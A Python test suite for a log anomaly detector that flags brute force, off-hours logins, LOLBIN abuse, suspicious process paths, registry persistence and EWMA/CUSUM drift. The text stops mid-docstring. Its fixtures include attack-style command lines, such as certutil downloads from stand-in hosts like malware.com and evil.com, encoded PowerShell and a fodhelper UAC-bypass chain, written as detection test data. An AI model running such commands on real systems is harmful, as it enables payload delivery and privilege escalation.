"""Tests for deterministic anomaly detection."""

import os

from nabla.detection import (
    detect_anomalies,
    parse_lolbin_block,
    format_anomaly_queue,
    compute_baselines,
    DEFAULT_THRESHOLDS,
)
from nabla.utils import is_routable_ip


# --- parse_rl_thresholds tests retired with the parser (Phase 3) ---


# --- parse_lolbin_block ---

def test_parse_lolbin_block_empty():
    """Empty block text returns empty list."""
    sigs = parse_lolbin_block("")
    assert sigs == []


def test_parse_lolbin_block_none():
    """None block text returns empty list."""
    sigs = parse_lolbin_block(None)
    assert sigs == []


def test_parse_lolbin_block_with_data():
    """Block with Windows LOLBIN data returns parsed signatures."""
    text = "=== WINDOWS LOLBINS ===\ncertutil | Download, Encode | T1105, T1140"
    sigs = parse_lolbin_block(text)
    assert len(sigs) >= 1
    # Check first sig
    name, patterns, mitre = sigs[0]
    assert name == "certutil"
    assert len(patterns) > 0
    assert "T1105" in mitre


def test_parse_lolbin_block_fallback():
    """Block with only Unix data returns fallback signatures."""
    text = "=== UNIX GTFOBINS ===\npython | shell | T1059"
    sigs = parse_lolbin_block(text)
    # Should fall back to FALLBACK_LOLBIN_SIGS since no Windows entries
    assert len(sigs) > 0


# --- format_anomaly_queue ---

def test_format_anomaly_queue_empty():
    """Empty anomalies list returns 'none' message."""
    text = format_anomaly_queue([])
    assert "none" in text


def test_format_anomaly_queue_with_anomalies():
    """Anomalies are formatted with severity and type."""
    anomalies = [
        {"type": "brute_force", "severity": "high", "details": "User admin"},
        {"type": "off_hours", "severity": "medium", "details": "User bob"},
    ]
    text = format_anomaly_queue(anomalies)
    assert "2" in text
    assert "HIGH" in text
    assert "brute_force" in text


def test_format_anomaly_queue_includes_entity_context():
    """Anomaly queue JSON includes entity_context when present."""
    anomalies = [
        {
            "type": "activity_spike",
            "severity": "high",
            "user": "joindomain",
            "details": "Spike detected",
            "entity_context": ["Exclusively joins computers to domain", "Managed by DevOps"],
        },
    ]
    text = format_anomaly_queue(anomalies)
    assert "entity_context" in text
    assert "Exclusively joins computers to domain" in text


# --- compute_baselines ---

def test_compute_baselines_basic():
    """Baselines computed from a small set of auth logs."""
    entries = [
        {"user": "alice", "action": "login_success", "timestamp": "2024-01-01T10:00:00Z"},
        {"user": "bob", "action": "login_failure", "timestamp": "2024-01-01T23:00:00Z"},
        {"user": "alice", "action": "login_success", "timestamp": "2024-01-01T11:00:00Z"},
    ]
    baselines = compute_baselines(entries)
    assert "users" in baselines
    assert "global" in baselines
    assert "alice" in baselines["users"]
    assert baselines["users"]["alice"]["total_events"] == 2
    assert baselines["global"]["total_users"] == 2


# --- detect_anomalies ---

def test_detect_pre_flagged():
    """Pre-flagged anomalies are detected."""
    entries = [
        {"user": "alice", "anomaly": "suspicious_login", "source_ip": "1.2.3.4",
         "timestamp": "2024-01-01T10:00:00Z", "details": "From unusual location"},
        {"user": "bob", "action": "login_success", "timestamp": "2024-01-01T10:00:00Z"},
    ]
    anomalies, _ = detect_anomalies(entries)
    pre_flagged = [a for a in anomalies if a["detection_method"] == "pre_flagged"]
    assert len(pre_flagged) == 1
    assert pre_flagged[0]["type"] == "suspicious_login"


def test_detect_z_score():
    """Z-score spike is detected when one user has many more events."""
    entries = []
    # Normal users: 2 events each
    for i in range(10):
        entries.append({"user": f"user_{i}", "action": "login_success",
                        "timestamp": "2024-01-01T10:00:00Z"})
        entries.append({"user": f"user_{i}", "action": "login_success",
                        "timestamp": "2024-01-01T11:00:00Z"})
    # Outlier: 50 events
    for _ in range(50):
        entries.append({"user": "outlier", "action": "login_success",
                        "timestamp": "2024-01-01T10:00:00Z"})

    anomalies, _ = detect_anomalies(entries)
    z_score = [a for a in anomalies if a["detection_method"] == "z_score"]
    assert len(z_score) >= 1
    assert z_score[0]["user"] == "outlier"


def test_detect_brute_force():
    """Brute force is detected when failure ratio exceeds threshold."""
    entries = [
        {"user": "attacker", "action": "login_failure", "source_ip": "10.0.0.1",
         "timestamp": "2024-01-01T10:00:00Z"},
        {"user": "attacker", "action": "login_failure", "source_ip": "10.0.0.1",
         "timestamp": "2024-01-01T10:01:00Z"},
        {"user": "attacker", "action": "login_failure", "source_ip": "10.0.0.1",
         "timestamp": "2024-01-01T10:02:00Z"},
        {"user": "attacker", "action": "login_success", "source_ip": "10.0.0.1",
         "timestamp": "2024-01-01T10:03:00Z"},
    ]
    anomalies, _ = detect_anomalies(entries)
    bf = [a for a in anomalies if a["detection_method"] == "failed_login_ratio"]
    assert len(bf) >= 1
    assert bf[0]["type"] == "brute_force_attempt"


def test_detect_off_hours():
    """Off-hours activity is detected when enough events occur at night."""
    entries = []
    for i in range(5):
        entries.append({"user": "nightowl", "action": "login_success",
                        "timestamp": "2024-01-01T23:00:00Z", "source_ip": "1.2.3.4"})
    anomalies, _ = detect_anomalies(entries)
    off_hours = [a for a in anomalies if a["detection_method"] == "off_hours"]
    assert len(off_hours) >= 1


def test_detect_multi_ip():
    """Multi-IP is detected when a user appears from many public IPs."""
    entries = []
    for i in range(5):
        entries.append({"user": "traveler", "action": "login_success",
                        "source_ip": f"1.2.{i}.1",
                        "timestamp": "2024-01-01T10:00:00Z"})
    anomalies, _ = detect_anomalies(entries)
    multi_ip = [a for a in anomalies if a["detection_method"] == "multi_ip"]
    assert len(multi_ip) >= 1


def test_detect_activity_spike():
    """Activity spike is detected when a user has many more events than mean."""
    entries = []
    # Normal users: 1 event each
    for i in range(5):
        entries.append({"user": f"normal_{i}", "action": "login_success",
                        "timestamp": "2024-01-01T10:00:00Z"})
    # Spiker: 20 events
    for _ in range(20):
        entries.append({"user": "spiker", "action": "login_success",
                        "timestamp": "2024-01-01T10:00:00Z"})
    anomalies, _ = detect_anomalies(entries)
    spike = [a for a in anomalies if a["detection_method"] == "activity_spike"]
    assert len(spike) >= 1


def test_detect_lolbin():
    """LOLBIN abuse is detected for suspicious command lines."""
    entries = [
        {"type": "endpoint", "user": "attacker", "process": "certutil.exe",
         "command_line": "certutil -urlcache -f http://malware.com/payload.exe C:\\temp\\p.exe",
         "timestamp": "2024-01-01T10:00:00Z", "source_ip": "10.0.0.1"},
    ]
    anomalies, _ = detect_anomalies(entries)
    lolbin = [a for a in anomalies if a["detection_method"] == "lolbin"]
    assert len(lolbin) >= 1
    assert "certutil" in lolbin[0]["details"].lower()


def test_detect_parent_child():
    """Suspicious parent-child process is detected."""
    entries = [
        {"type": "endpoint", "user": "attacker", "parent_process": "winword.exe",
         "process": "cmd.exe", "command_line": "cmd /c whoami",
         "timestamp": "2024-01-01T10:00:00Z", "source_ip": "10.0.0.1"},
    ]
    anomalies, _ = detect_anomalies(entries)
    pc = [a for a in anomalies if a["detection_method"] == "parent_child"]
    assert len(pc) >= 1


def test_detect_rapid_action_sequence():
    """Rapid action sequence is detected for create->execute->delete within window."""
    entries = [
        {"type": "endpoint", "user": "lateral", "host": "WS01",
         "action": "create", "command_line": "echo test > file.txt",
         "timestamp": "2024-01-01T10:00:00Z"},
        {"type": "endpoint", "user": "lateral", "host": "WS01",
         "action": "execute", "command_line": "file.txt",
         "timestamp": "2024-01-01T10:05:00Z"},
        {"type": "endpoint", "user": "lateral", "host": "WS01",
         "action": "delete", "command_line": "del file.txt",
         "timestamp": "2024-01-01T10:10:00Z"},
    ]
    anomalies, _ = detect_anomalies(entries)
    seq = [a for a in anomalies if a["detection_method"] == "action_sequence"]
    assert len(seq) >= 1


def test_detect_no_anomalies():
    """Clean logs produce no anomalies."""
    entries = [
        {"user": "alice", "action": "login_success", "timestamp": "2024-01-01T10:00:00Z"},
        {"user": "bob", "action": "login_success", "timestamp": "2024-01-01T10:00:00Z"},
    ]
    anomalies, baselines = detect_anomalies(entries)
    # Only z-score or spike might fire with very few entries
    # but pre-flagged, brute force, off-hours, multi-IP should be 0
    pre_flagged = [a for a in anomalies if a["detection_method"] == "pre_flagged"]
    bf = [a for a in anomalies if a["detection_method"] == "failed_login_ratio"]
    assert len(pre_flagged) == 0
    assert len(bf) == 0


def test_detect_custom_thresholds():
    """Custom thresholds are respected."""
    entries = [
        {"user": "attacker", "action": "login_failure", "source_ip": "10.0.0.1",
         "timestamp": "2024-01-01T10:00:00Z"},
        {"user": "attacker", "action": "login_failure", "source_ip": "10.0.0.1",
         "timestamp": "2024-01-01T10:01:00Z"},
        {"user": "attacker", "action": "login_failure", "source_ip": "10.0.0.1",
         "timestamp": "2024-01-01T10:02:00Z"},
    ]
    # With threshold at 1.0 (100%), brute force should not fire (3/3 = 100% is not > 100%)
    thresholds = {"brute_force_ratio": 1.0}
    anomalies, _ = detect_anomalies(entries, thresholds=thresholds)
    bf = [a for a in anomalies if a["detection_method"] == "failed_login_ratio"]
    assert len(bf) == 0


def test_detect_returns_baselines():
    """Detection returns baselines dict with users and global stats."""
    entries = [
        {"user": "alice", "action": "login_success", "timestamp": "2024-01-01T10:00:00Z"},
    ]
    _, baselines = detect_anomalies(entries)
    assert "users" in baselines
    assert "global" in baselines
    assert baselines["global"]["total_events"] == 1


def test_detect_unusual_process():
    """Unusual process per host is detected when process not in baseline."""
    entries = [
        {"type": "endpoint", "user": "admin", "host": "WS01",
         "process": "malware.exe", "timestamp": "2024-01-01T10:00:00Z"},
    ]
    baseline_host_procs = {"WS01": ["explorer", "svchost", "csrss"]}
    anomalies, _ = detect_anomalies(entries, baseline_host_procs=baseline_host_procs)
    unusual = [a for a in anomalies if a["detection_method"] == "unusual_process"]
    assert len(unusual) >= 1


def test_detect_critical_host_escalation():
    """Critical host escalation is detected for sudo on a critical host."""
    entries = [
        {"type": "endpoint", "user": "user1", "host": "DC01",
         "process": "bash", "command_line": "sudo su -",
         "timestamp": "2024-01-01T10:00:00Z", "source_ip": "10.0.0.1"},
    ]
    anomalies, _ = detect_anomalies(entries)
    esc = [a for a in anomalies if a["detection_method"] == "critical_host_escalation"]
    assert len(esc) >= 1


# --- Edge cases and sensitivity branches ---

def test_detect_empty_entries():
    """Empty entries list returns no anomalies and zeroed baselines."""
    anomalies, baselines = detect_anomalies([])
    assert anomalies == []
    assert baselines["global"]["total_events"] == 0
    assert baselines["global"]["total_users"] == 0


def test_detect_brute_force_below_min_auth():
    """Fewer than 3 auth events should not trigger brute force."""
    entries = [
        {"user": "attacker", "action": "login_failure", "source_ip": "10.0.0.1",
         "timestamp": "2024-01-01T10:00:00Z"},
        {"user": "attacker", "action": "login_failure", "source_ip": "10.0.0.1",
         "timestamp": "2024-01-01T10:01:00Z"},
    ]
    anomalies, _ = detect_anomalies(entries)
    bf = [a for a in anomalies if a["detection_method"] == "failed_login_ratio"]
    assert len(bf) == 0


def test_detect_brute_force_at_threshold():
    """Failure ratio exactly equal to threshold should not trigger (uses >)."""
    entries = [
        {"user": "attacker", "action": "login_failure", "source_ip": "10.0.0.1",
         "timestamp": "2024-01-01T10:00:00Z"},
        {"user": "attacker", "action": "login_failure", "source_ip": "10.0.0.1",
         "timestamp": "2024-01-01T10:01:00Z"},
        {"user": "attacker", "action": "login_success", "source_ip": "10.0.0.1",
         "timestamp": "2024-01-01T10:02:00Z"},
        {"user": "attacker", "action": "login_success", "source_ip": "10.0.0.1",
         "timestamp": "2024-01-01T10:03:00Z"},
    ]
    # 2/4 = 0.5, exactly at default threshold of 0.5 — should not fire
    anomalies, _ = detect_anomalies(entries)
    bf = [a for a in anomalies if a["detection_method"] == "failed_login_ratio"]
    assert len(bf) == 0


def test_detect_multi_ip_below_threshold():
    """User with fewer IPs than threshold should not trigger."""
    entries = [
        {"user": "normal", "action": "login_success",
         "source_ip": "10.0.0.1", "timestamp": "2024-01-01T10:00:00Z"},
        {"user": "normal", "action": "login_success",
         "source_ip": "10.0.0.2", "timestamp": "2024-01-01T10:01:00Z"},
    ]
    anomalies, _ = detect_anomalies(entries)
    multi_ip = [a for a in anomalies if a["detection_method"] == "multi_ip"]
    assert len(multi_ip) == 0  # 2 IPs < threshold of 3


def test_detect_off_hours_boundary():
    """Events at exactly 06:00 and 22:00 should not be off-hours."""
    entries = [
        {"user": "boundary", "action": "login_success",
         "timestamp": "2024-01-01T06:00:00Z", "source_ip": "1.2.3.4"},
        {"user": "boundary", "action": "login_success",
         "timestamp": "2024-01-01T22:00:00Z", "source_ip": "1.2.3.4"},
        {"user": "boundary", "action": "login_success",
         "timestamp": "2024-01-01T10:00:00Z", "source_ip": "1.2.3.4"},
    ]
    anomalies, _ = detect_anomalies(entries)
    off_hours = [a for a in anomalies if a["detection_method"] == "off_hours"]
    assert len(off_hours) == 0  # 06:00 and 22:00 are not off-hours


def test_detect_lolbin_low_sensitivity():
    """With lolbin_sensitivity < 0.5, need 2+ pattern matches to trigger."""
    entries = [
        {"type": "endpoint", "user": "attacker", "process": "certutil.exe",
         "command_line": "certutil -somebenignflag",
         "timestamp": "2024-01-01T10:00:00Z", "source_ip": "10.0.0.1"},
    ]
    thresholds = {"lolbin_sensitivity": 0.3}
    anomalies, _ = detect_anomalies(entries, thresholds=thresholds)
    lolbin = [a for a in anomalies if a["detection_method"] == "lolbin"]
    assert len(lolbin) == 0  # Only 0 pattern matches, needs 2+


def test_detect_lolbin_high_sensitivity():
    """With lolbin_sensitivity >= 0.9, LOLBIN triggers even with empty command line."""
    entries = [
        {"type": "endpoint", "user": "attacker", "process": "certutil.exe",
         "command_line": "", "timestamp": "2024-01-01T10:00:00Z", "source_ip": "10.0.0.1"},
    ]
    thresholds = {"lolbin_sensitivity": 0.9}
    anomalies, _ = detect_anomalies(entries, thresholds=thresholds)
    lolbin = [a for a in anomalies if a["detection_method"] == "lolbin"]
    assert len(lolbin) >= 1


def test_detect_parent_child_low_sensitivity():
    """With parent_child_sensitivity < 0.5, benign command should not trigger."""
    entries = [
        {"type": "endpoint", "user": "user1", "parent_process": "winword.exe",
         "process": "cmd.exe", "command_line": "dir /b",
         "timestamp": "2024-01-01T10:00:00Z", "source_ip": "10.0.0.1"},
    ]
    thresholds = {"parent_child_sensitivity": 0.3}
    anomalies, _ = detect_anomalies(entries, thresholds=thresholds)
    pc = [a for a in anomalies if a["detection_method"] == "parent_child"]
    assert len(pc) == 0  # "dir /b" is not suspicious


def test_detect_parent_child_sysmon_fields():
    """Parent-child detection works with Sysmon field names (ParentImage, NewProcessName)."""
    entries = [
        {"type": "endpoint", "User": "attacker", "ParentImage": "winword.exe",
         "NewProcessName": "powershell.exe", "CommandLine": "powershell -enc base64payload",
         "timestamp": "2024-01-01T10:00:00Z", "source_ip": "10.0.0.1"},
    ]
    anomalies, _ = detect_anomalies(entries)
    pc = [a for a in anomalies if a["detection_method"] == "parent_child"]
    assert len(pc) >= 1


def test_detect_critical_host_uac_bypass():
    """UAC bypass chain (fodhelper -> suspicious child) on critical host."""
    entries = [
        {"type": "endpoint", "user": "attacker", "host": "DC01",
         "parent_process": "fodhelper.exe", "process": "powershell.exe",
         "command_line": "powershell -enc payload",
         "timestamp": "2024-01-01T10:00:00Z", "source_ip": "10.0.0.1"},
    ]
    anomalies, _ = detect_anomalies(entries)
    esc = [a for a in anomalies if a["detection_method"] == "critical_host_escalation"]
    assert len(esc) >= 1


def test_detect_critical_host_auto_detection():
    """Critical hosts are auto-detected from hostname keywords (DC, DOMAIN, PROD)."""
    entries = [
        {"type": "endpoint", "user": "user1", "host": "PROD-WEB01",
         "process": "bash", "command_line": "sudo su -",
         "timestamp": "2024-01-01T10:00:00Z", "source_ip": "10.0.0.1"},
    ]
    anomalies, _ = detect_anomalies(entries)
    esc = [a for a in anomalies if a["detection_method"] == "critical_host_escalation"]
    assert len(esc) >= 1


def test_detect_critical_host_low_sensitivity():
    """With critical_host_sensitivity < 0.5, non-critical severity escalation is suppressed."""
    entries = [
        {"type": "endpoint", "user": "user1", "host": "DC01",
         "process": "bash", "command_line": "whoami",
         "action": "execute", "timestamp": "2024-01-01T10:00:00Z", "source_ip": "10.0.0.1"},
    ]
    thresholds = {"critical_host_sensitivity": 0.9}
    anomalies, _ = detect_anomalies(entries, thresholds=thresholds)
    esc = [a for a in anomalies if a["detection_method"] == "critical_host_escalation"]
    # At sensitivity 0.9, non-admin execute on critical host should trigger
    assert len(esc) >= 1


def test_detect_unusual_process_common_skipped():
    """Common processes (explorer, svchost) are skipped at default sensitivity."""
    entries = [
        {"type": "endpoint", "user": "admin", "host": "WS01",
         "process": "explorer.exe", "timestamp": "2024-01-01T10:00:00Z"},
    ]
    baseline_host_procs = {"WS01": ["svchost"]}
    anomalies, _ = detect_anomalies(entries, baseline_host_procs=baseline_host_procs)
    unusual = [a for a in anomalies if a["detection_method"] == "unusual_process"]
    assert len(unusual) == 0  # explorer is common, skipped


def test_detect_unusual_process_low_sensitivity():
    """With unusual_process_sensitivity < 0.5, only LOLBIN processes are flagged."""
    entries = [
        {"type": "endpoint", "user": "admin", "host": "WS01",
         "process": "unknown_app.exe", "timestamp": "2024-01-01T10:00:00Z"},
        {"type": "endpoint", "user": "admin", "host": "WS01",
         "process": "certutil.exe", "command_line": "certutil -urlcache -f http://evil.com/p",
         "timestamp": "2024-01-01T10:01:00Z"},
    ]
    thresholds = {"unusual_process_sensitivity": 0.3}
    baseline_host_procs = {"WS01": ["explorer"]}
    anomalies, _ = detect_anomalies(entries, thresholds=thresholds, baseline_host_procs=baseline_host_procs)
    unusual = [a for a in anomalies if a["detection_method"] == "unusual_process"]
    # Only certutil (LOLBIN) should be flagged, not unknown_app
    lolbin_unusual = [a for a in unusual if "certutil" in a.get("process", "")]
    non_lolbin_unusual = [a for a in unusual if "unknown_app" in a.get("process", "")]
    assert len(lolbin_unusual) >= 1
    assert len(non_lolbin_unusual) == 0


def test_detect_rapid_action_sequence_missing_timestamp():
    """Rapid action sequence with missing timestamps should not trigger."""
    entries = [
        {"type": "endpoint", "user": "lateral", "host": "WS01",
         "action": "create", "command_line": "echo test > file.txt",
         "timestamp": ""},
        {"type": "endpoint", "user": "lateral", "host": "WS01",
         "action": "execute", "command_line": "file.txt",
         "timestamp": "2024-01-01T10:05:00Z"},
        {"type": "endpoint", "user": "lateral", "host": "WS01",
         "action": "delete", "command_line": "del file.txt",
         "timestamp": "2024-01-01T10:10:00Z"},
    ]
    anomalies, _ = detect_anomalies(entries)
    seq = [a for a in anomalies if a["detection_method"] == "action_sequence"]
    assert len(seq) == 0  # Missing timestamp prevents detection


def test_detect_rapid_action_sequence_inferred_actions():
    """Action types are inferred from command line when action field is missing."""
    entries = [
        {"type": "endpoint", "user": "lateral", "host": "WS01",
         "command_line": "echo test > file.txt",
         "timestamp": "2024-01-01T10:00:00Z"},
        {"type": "endpoint", "user": "lateral", "host": "WS01",
         "command_line": "file.txt",
         "timestamp": "2024-01-01T10:05:00Z"},
        {"type": "endpoint", "user": "lateral", "host": "WS01",
         "command_line": "del file.txt",
         "timestamp": "2024-01-01T10:10:00Z"},
    ]
    anomalies, _ = detect_anomalies(entries)
    seq = [a for a in anomalies if a["detection_method"] == "action_sequence"]
    assert len(seq) >= 1


def test_compute_baselines_empty():
    """Baselines from empty entries returns zeroed global stats."""
    baselines = compute_baselines([])
    assert baselines["global"]["total_events"] == 0
    assert baselines["global"]["total_users"] == 0
    assert baselines["users"] == {}


def test_compute_baselines_non_auth():
    """Baselines computed from non-auth logs using protocol/query_type fallbacks."""
    entries = [
        {"src_ip": "10.0.0.1", "protocol": "TCP", "timestamp": "2024-01-01T10:00:00Z"},
        {"client_ip": "10.0.0.2", "query_type": "A", "timestamp": "2024-01-01T11:00:00Z"},
    ]
    baselines = compute_baselines(entries)
    assert baselines["global"]["total_events"] == 2


def test_get_field_fallback():
    """_get_field returns first non-empty value from candidate names."""
    from nabla.detection import _get_field
    entry = {"source_ip": "1.2.3.4", "src_ip": "5.6.7.8"}
    assert _get_field(entry, "source_ip", "src_ip") == "1.2.3.4"
    assert _get_field(entry, "missing", "src_ip") == "5.6.7.8"
    assert _get_field(entry, "missing", "also_missing") == ""


def test_detect_partial_thresholds_merge():
    """Partial thresholds dict merges with defaults for missing keys."""
    entries = [
        {"user": "alice", "action": "login_success", "timestamp": "2024-01-01T10:00:00Z"},
    ]
    anomalies, _ = detect_anomalies(entries, thresholds={"z_score_sigma": 5.0})
    # Should not crash — all other thresholds should use defaults


def test_detect_log_type_inferred():
    """Anomalies get log_type inferred from user/IP lookup in source entries."""
    entries = []
    # Normal users with few events each
    for u in range(5):
        for i in range(3):
            entries.append({
                "type": "auth",
                "user": f"normal_{u}",
                "source_ip": f"10.0.0.{u}",
                "action": "login",
                "timestamp": f"2024-01-01T12:{i:02d}:00Z",
            })
    # One user with many events (triggers z-score)
    for i in range(50):
        entries.append({
            "type": "auth",
            "user": "busy_user",
            "source_ip": "10.0.1.5",
            "action": "login",
            "timestamp": f"2024-01-01T12:{i:02d}:00Z",
        })
    anomalies, _ = detect_anomalies(entries)
    assert len(anomalies) > 0
    for a in anomalies:
        assert "log_type" in a
        assert a["log_type"] == "auth"


def test_detect_log_type_mixed():
    """Anomalies for users appearing in multiple log types get log_type='mixed'."""
    entries = []
    # Normal users
    for u in range(5):
        for i in range(3):
            entries.append({
                "type": "auth",
                "user": f"normal_{u}",
                "source_ip": f"10.0.0.{u}",
                "action": "login",
                "timestamp": f"2024-01-01T12:{i:02d}:00Z",
            })
    # Cross-type user with many events
    for i in range(50):
        entries.append({
            "type": "auth",
            "user": "cross_user",
            "source_ip": "10.0.1.5",
            "action": "login",
            "timestamp": f"2024-01-01T12:{i:02d}:00Z",
        })
    for i in range(10):
        entries.append({
            "type": "dns",
            "user": "cross_user",
            "source_ip": "10.0.1.5",
            "action": "query",
            "domain": "evil.com",
            "timestamp": f"2024-01-01T12:{i:02d}:00Z",
        })
    anomalies, _ = detect_anomalies(entries)
    assert len(anomalies) > 0
    for a in anomalies:
        assert "log_type" in a
        # User appears in both auth and dns → mixed
        assert a["log_type"] == "mixed"


# --- Suspicious file path detection (method 12) ---

def test_suspicious_path_shallow():
    """Process from a shallow path (C:\\Dir\\File.exe) is flagged."""
    entries = [
        {"type": "endpoint", "process": "C:\\Intel\\Build\\LB3.exe",
         "user": "admin", "timestamp": "2024-01-01T10:00:00Z", "action": "process_create"},
    ]
    anomalies, _ = detect_anomalies(entries)
    path_anomalies = [a for a in anomalies if a["detection_method"] == "suspicious_path"]
    assert len(path_anomalies) == 1
    assert "shallow_path" in path_anomalies[0]["details"]


def test_suspicious_path_temp():
    """Process from a temp directory is flagged."""
    entries = [
        {"type": "endpoint", "process": "C:\\Windows\\Temp\\payload.exe",
         "user": "admin", "timestamp": "2024-01-01T10:00:00Z", "action": "process_create"},
    ]
    anomalies, _ = detect_anomalies(entries)
    path_anomalies = [a for a in anomalies if a["detection_method"] == "suspicious_path"]
    assert len(path_anomalies) == 1


def test_suspicious_path_legitimate_not_flagged():
    """Process from System32 is NOT flagged as suspicious."""
    entries = [
        {"type": "endpoint", "process": "C:\\Windows\\System32\\svchost.exe",
         "user": "SYSTEM", "timestamp": "2024-01-01T10:00:00Z", "action": "process_create"},
    ]
    anomalies, _ = detect_anomalies(entries)
    path_anomalies = [a for a in anomalies if a["detection_method"] == "suspicious_path"]
    assert len(path_anomalies) == 0


def test_suspicious_path_low_sensitivity():
    """At low sensitivity, single-pattern matches are suppressed."""
    entries = [
        {"type": "endpoint", "process": "C:\\Users\\admin\\AppData\\Local\\update.exe",
         "user": "admin", "timestamp": "2024-01-01T10:00:00Z", "action": "process_create"},
    ]
    anomalies, _ = detect_anomalies(entries, thresholds={"suspicious_path_sensitivity": 0.3})
    path_anomalies = [a for a in anomalies if a["detection_method"] == "suspicious_path"]
    # AppData is a single pattern match — suppressed at low sensitivity
    assert len(path_anomalies) == 0


# --- Integrity anomaly detection (method 13) ---

def test_integrity_anomaly_system_from_non_system_parent():
    """SYSTEM process from a non-system parent is flagged."""
    entries = [
        {"type": "endpoint", "process": "C:\\Intel\\Build\\LB3.exe",
         "parent_process": "C:\\Users\\admin\\Downloads\\loader.exe",
         "user": "NT AUTHORITY\\SYSTEM", "IntegrityLevel": "System",
         "timestamp": "2024-01-01T10:00:00Z", "action": "process_create"},
    ]
    anomalies, _ = detect_anomalies(entries)
    ia_anomalies = [a for a in anomalies if a["detection_method"] == "integrity_anomaly"]
    assert len(ia_anomalies) == 1


def test_integrity_anomaly_system_parent_not_flagged():
    """SYSTEM process from services.exe is NOT flagged."""
    entries = [
        {"type": "endpoint", "process": "C:\\Windows\\System32\\svchost.exe",
         "parent_process": "C:\\Windows\\System32\\services.exe",
         "user": "NT AUTHORITY\\SYSTEM", "IntegrityLevel": "System",
         "timestamp": "2024-01-01T10:00:00Z", "action": "process_create"},
    ]
    anomalies, _ = detect_anomalies(entries)
    ia_anomalies = [a for a in anomalies if a["detection_method"] == "integrity_anomaly"]
    assert len(ia_anomalies) == 0


# --- Registry abuse detection (method 14) ---

def test_registry_abuse_critical_key():
    """Registry modification of a critical key by a suspicious process is flagged."""
    entries = [
        {"type": "endpoint", "process": "C:\\Intel\\Build\\LB3.exe",
         "action": "registry_set", "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\test\\Enabled",
         "user": "EC2AMAZ-I41BETP\\Administrator", "timestamp": "2024-01-01T10:00:00Z"},
    ]
    anomalies, _ = detect_anomalies(entries)
    ra_anomalies = [a for a in anomalies if a["detection_method"] == "registry_abuse"]
    assert len(ra_anomalies) == 1
    assert ra_anomalies[0]["severity"] == "high"  # Critical registry key


def test_registry_abuse_legitimate_process_not_flagged():
    """Registry modification by a legitimate process is not flagged at default sensitivity."""
    entries = [
        {"type": "endpoint", "process": "C:\\Windows\\System32\\svchost.exe",
         "action": "registry_set", "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\test",
         "user": "SYSTEM", "timestamp": "2024-01-01T10:00:00Z"},
    ]
    anomalies, _ = detect_anomalies(entries)
    ra_anomalies = [a for a in anomalies if a["detection_method"] == "registry_abuse"]
    assert len(ra_anomalies) == 0


def test_registry_abuse_run_key():
    """Modification of CurrentVersion\\Run by any process is flagged."""
    entries = [
        {"type": "endpoint", "process": "C:\\Users\\admin\\tool.exe",
         "action": "registry_set", "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\malware",
         "user": "admin", "timestamp": "2024-01-01T10:00:00Z"},
    ]
    anomalies, _ = detect_anomalies(entries)
    ra_anomalies = [a for a in anomalies if a["detection_method"] == "registry_abuse"]
    assert len(ra_anomalies) == 1


# --- Network anomaly detection (method 15) ---

def test_network_anomaly_lolbin():
    """Network connection from a LOLBIN process is flagged."""
    entries = [
        {"type": "endpoint", "process": "C:\\Windows\\System32\\certutil.exe",
         "action": "network_connect", "DestinationIp": "10.0.0.1", "DestinationPort": "443",
         "user": "admin", "timestamp": "2024-01-01T10:00:00Z"},
    ]
    anomalies, _ = detect_anomalies(entries)
    na_anomalies = [a for a in anomalies if a["detection_method"] == "network_anomaly"]
    assert len(na_anomalies) == 1
    assert na_anomalies[0]["severity"] == "high"


def test_network_anomaly_suspicious_path():
    """Network connection from a suspicious path is flagged."""
    entries = [
        {"type": "endpoint", "process": "C:\\Intel\\Build\\LB3.exe",
         "action": "network_connect", "DestinationIp": "10.0.0.1", "DestinationPort": "443",
         "user": "admin", "timestamp": "2024-01-01T10:00:00Z"},
    ]
    anomalies, _ = detect_anomalies(entries)
    na_anomalies = [a for a in anomalies if a["detection_method"] == "network_anomaly"]
    assert len(na_anomalies) == 1


def test_network_anomaly_legitimate_not_flagged():
    """Network connection from a legitimate process is not flagged."""
    entries = [
        {"type": "endpoint", "process": "C:\\Program Files\\Browser\\chrome.exe",
         "action": "network_connect", "DestinationIp": "10.0.0.1", "DestinationPort": "443",
         "user": "admin", "timestamp": "2024-01-01T10:00:00Z"},
    ]
    anomalies, _ = detect_anomalies(entries)
    na_anomalies = [a for a in anomalies if a["detection_method"] == "network_anomaly"]
    assert len(na_anomalies) == 0


# --- Threshold clamping ---



def test_ewma_detects_gradual_drift():
    """EWMA flags a user whose event rate gradually increases.

    A user going from 2→5→12→25 events per bin should trigger EWMA
    even though z-score might not catch the gradual ramp.
    """
    entries = _make_ewma_entries("attacker", [2, 2, 3, 5, 8, 12, 20, 30])
    anomalies, _ = detect_anomalies(entries)
    ewma = [a for a in anomalies if a["detection_method"] == "ewma"]
    assert len(ewma) >= 1, f"Expected EWMA anomaly, got {[a['detection_method'] for a in anomalies]}"
    assert ewma[0]["user"] == "attacker"


def test_ewma_no_alert_on_steady_rate():
    """EWMA does not flag a user with consistent event rate."""
    entries = _make_ewma_entries("normal", [10, 10, 11, 10, 9, 10, 11, 10])
    anomalies, _ = detect_anomalies(entries)
    ewma = [a for a in anomalies if a["detection_method"] == "ewma"]
    assert len(ewma) == 0, f"EWMA should not flag steady rate, got {ewma}"


def test_ewma_no_alert_on_few_bins():
    """EWMA requires at least 3 bins to compute."""
    entries = _make_ewma_entries("sparse", [100, 100])  # Only 2 bins
    anomalies, _ = detect_anomalies(entries)
    ewma = [a for a in anomalies if a["detection_method"] == "ewma"]
    assert len(ewma) == 0


def test_ewma_sensitivity_zero_skips():
    """EWMA is skipped when sensitivity is 0."""
    entries = _make_ewma_entries("attacker", [2, 2, 3, 5, 8, 12, 20, 30])
    anomalies, _ = detect_anomalies(entries, thresholds={"ewma_sensitivity": 0.0})
    ewma = [a for a in anomalies if a["detection_method"] == "ewma"]
    assert len(ewma) == 0


def test_ewma_one_alert_per_user():
    """EWMA produces at most one alert per user."""
    entries = _make_ewma_entries("attacker", [2, 2, 3, 5, 8, 12, 20, 30, 50, 80])
    anomalies, _ = detect_anomalies(entries)
    ewma = [a for a in anomalies if a["detection_method"] == "ewma"]
    assert len(ewma) <= 1


# --- CUSUM detection ---

def test_cusum_detects_sustained_shift():
    """CUSUM flags a user with sustained increase in event rate.

    A user going from 10→10→10→15→15→15→15 should trigger CUSUM
